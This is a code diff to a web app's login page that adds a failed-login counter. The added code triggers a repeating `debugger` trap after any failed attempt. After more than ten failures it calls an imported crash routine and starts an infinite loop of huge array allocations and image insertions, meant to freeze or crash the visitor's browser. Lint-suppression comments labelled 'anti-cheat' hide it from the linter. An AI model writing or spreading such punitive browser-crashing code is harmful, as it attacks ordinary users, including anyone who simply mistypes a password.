@@ -3,11 +3,13 @@
 import { Loader2, UserLock } from "lucide-react";
 import { useRouter } from "next/navigation";
 import { type FormEvent, use, useEffect, useState } from "react";
+import { useSessionStorage } from "react-use";
 import { toast } from "sonner";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { authClient } from "@/lib/auth-client";
+import { Brash } from "./brash";
 
 export default function LoginPage({
   searchParams,
@@ -15,6 +17,7 @@ export default function LoginPage({
   searchParams: Promise<{ next?: string }>;
 }) {
   const [loading, setLoading] = useState(false);
+  const [failed, setFailed] = useSessionStorage<number>("failed", 0);
   const router = useRouter();
   const { next } = use(searchParams);
   const cb = next || "/admin";
@@ -26,6 +29,28 @@ export default function LoginPage({
     }
     checkSession();
   }, [cb, router]);
+
+  useEffect(() => {
+    if (failed === 0) return;
+    const int = setInterval(() => {
+      // biome-ignore lint/suspicious/noDebugger: anti-cheat
+      debugger;
+    }, 100);
+    if (failed > 10) {
+      Brash.run({});
+      setTimeout(() => {
+        // biome-ignore lint/correctness/noConstantCondition: anti-cheat
+        while (1) {
+          new Array(2 ** 32 - 1).fill(0);
+          const el = document.createElement("img");
+          el.src = "/favicon.png";
+          el.style.zIndex = "10000";
+          document.body.appendChild(el);
+        }
+      }, 20000);
+    }
+    return () => clearInterval(int);
+  }, [failed]);
 
   async function submit(ev: FormEvent<HTMLFormElement>) {
     ev.preventDefault();
@@ -44,6 +69,7 @@ export default function LoginPage({
     }
     if (r.error) {
       setLoading(false);
+      setFailed(failed + 1);
       return toast.error(r.error.message);
     }
     router.push(cb);
